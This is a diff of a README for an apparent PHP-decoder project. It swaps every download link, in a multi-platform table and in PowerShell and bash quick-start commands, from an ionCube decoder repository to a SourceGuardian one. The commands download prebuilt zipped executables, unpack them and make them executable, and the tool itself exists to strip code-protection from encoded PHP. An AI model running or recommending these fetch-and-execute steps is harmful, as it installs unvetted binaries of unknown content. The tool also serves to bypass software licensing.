@@ -41,31 +41,31 @@ decoded/
 
 | Platform | Architecture | Download |
 |----------|-------------|---------|
-| **Windows** | x64 (64-bit) | [decoder-windows-x64.exe.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-windows-x64.exe.zip) |
-| **Windows** | x86 (32-bit) | [decoder-windows-x86.exe.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-windows-x86.exe.zip) |
-| **Windows** | ARM64 | [decoder-windows-arm64.exe.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-windows-arm64.exe.zip) |
-| **Linux** | x64 (64-bit) | [decoder-linux-x64.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-linux-x64.zip) |
-| **Linux** | x86 (32-bit) | [decoder-linux-x86.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-linux-x86.zip) |
-| **Linux** | ARM64 / Android | [decoder-linux-arm64.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-linux-arm64.zip) |
-| **Linux** | ARM32 | [decoder-linux-arm32.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-linux-arm32.zip) |
-| **Linux** | MIPS little-endian | [decoder-linux-mipsle.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-linux-mipsle.zip) |
-| **Linux** | MIPS big-endian | [decoder-linux-mips.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-linux-mips.zip) |
-| **Linux** | MIPS64 LE | [decoder-linux-mips64le.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-linux-mips64le.zip) |
-| **Linux** | MIPS64 BE | [decoder-linux-mips64.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-linux-mips64.zip) |
-| **Linux** | RISC-V 64 | [decoder-linux-riscv64.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-linux-riscv64.zip) |
-| **Linux** | PowerPC 64 LE | [decoder-linux-ppc64le.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-linux-ppc64le.zip) |
-| **Linux** | PowerPC 64 | [decoder-linux-ppc64.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-linux-ppc64.zip) |
-| **Linux** | s390x (IBM Z) | [decoder-linux-s390x.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-linux-s390x.zip) |
-| **macOS** | Intel (x64) | [decoder-macos-x64.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-macos-x64.zip) |
-| **macOS** | Apple Silicon (ARM64) | [decoder-macos-arm64.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-macos-arm64.zip) |
-| **FreeBSD** | x64 | [decoder-freebsd-x64.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-freebsd-x64.zip) |
-| **FreeBSD** | ARM64 | [decoder-freebsd-arm64.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-freebsd-arm64.zip) |
-| **NetBSD** | x64 | [decoder-netbsd-x64.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-netbsd-x64.zip) |
-| **OpenBSD** | x64 | [decoder-openbsd-x64.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-openbsd-x64.zip) |
-| **Solaris** | x64 | [decoder-solaris-x64.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-solaris-x64.zip) |
-| **Plan 9** | x64 | [decoder-plan9-x64.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-plan9-x64.zip) |
-| **WebAssembly** | WASI | [decoder-wasip1.wasm.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-wasip1.wasm.zip) |
-| 📦 **All platforms** | combined bundle | [decoder-bundle.zip](https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-bundle.zip) |
+| **Windows** | x64 (64-bit) | [decoder-windows-x64.exe.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-windows-x64.exe.zip) |
+| **Windows** | x86 (32-bit) | [decoder-windows-x86.exe.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-windows-x86.exe.zip) |
+| **Windows** | ARM64 | [decoder-windows-arm64.exe.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-windows-arm64.exe.zip) |
+| **Linux** | x64 (64-bit) | [decoder-linux-x64.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-linux-x64.zip) |
+| **Linux** | x86 (32-bit) | [decoder-linux-x86.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-linux-x86.zip) |
+| **Linux** | ARM64 / Android | [decoder-linux-arm64.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-linux-arm64.zip) |
+| **Linux** | ARM32 | [decoder-linux-arm32.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-linux-arm32.zip) |
+| **Linux** | MIPS little-endian | [decoder-linux-mipsle.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-linux-mipsle.zip) |
+| **Linux** | MIPS big-endian | [decoder-linux-mips.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-linux-mips.zip) |
+| **Linux** | MIPS64 LE | [decoder-linux-mips64le.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-linux-mips64le.zip) |
+| **Linux** | MIPS64 BE | [decoder-linux-mips64.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-linux-mips64.zip) |
+| **Linux** | RISC-V 64 | [decoder-linux-riscv64.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-linux-riscv64.zip) |
+| **Linux** | PowerPC 64 LE | [decoder-linux-ppc64le.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-linux-ppc64le.zip) |
+| **Linux** | PowerPC 64 | [decoder-linux-ppc64.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-linux-ppc64.zip) |
+| **Linux** | s390x (IBM Z) | [decoder-linux-s390x.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-linux-s390x.zip) |
+| **macOS** | Intel (x64) | [decoder-macos-x64.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-macos-x64.zip) |
+| **macOS** | Apple Silicon (ARM64) | [decoder-macos-arm64.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-macos-arm64.zip) |
+| **FreeBSD** | x64 | [decoder-freebsd-x64.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-freebsd-x64.zip) |
+| **FreeBSD** | ARM64 | [decoder-freebsd-arm64.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-freebsd-arm64.zip) |
+| **NetBSD** | x64 | [decoder-netbsd-x64.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-netbsd-x64.zip) |
+| **OpenBSD** | x64 | [decoder-openbsd-x64.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-openbsd-x64.zip) |
+| **Solaris** | x64 | [decoder-solaris-x64.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-solaris-x64.zip) |
+| **Plan 9** | x64 | [decoder-plan9-x64.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-plan9-x64.zip) |
+| **WebAssembly** | WASI | [decoder-wasip1.wasm.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-wasip1.wasm.zip) |
+| 📦 **All platforms** | combined bundle | [decoder-bundle.zip](https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-bundle.zip) |
 
 ---
 
@@ -76,14 +76,14 @@ decoded/
 **Windows (PowerShell)**
 ```powershell
 # Download
-Invoke-WebRequest -Uri "https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-windows-x64.exe.zip" -OutFile decoder.zip
+Invoke-WebRequest -Uri "https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-windows-x64.exe.zip" -OutFile decoder.zip
 Expand-Archive decoder.zip .
 ```
 
 **Linux / macOS (bash)**
 ```bash
 # Download
-curl -L "https://github.com/source-vault/ioncube_decoder/raw/refs/heads/main/decoders/decoder-linux-x64.zip" -o decoder.zip
+curl -L "https://github.com/source-vault/sourceguardian_decoder/raw/refs/heads/main/decoders/decoder-linux-x64.zip" -o decoder.zip
 unzip decoder.zip
 chmod +x decoder-linux-x64
 ```
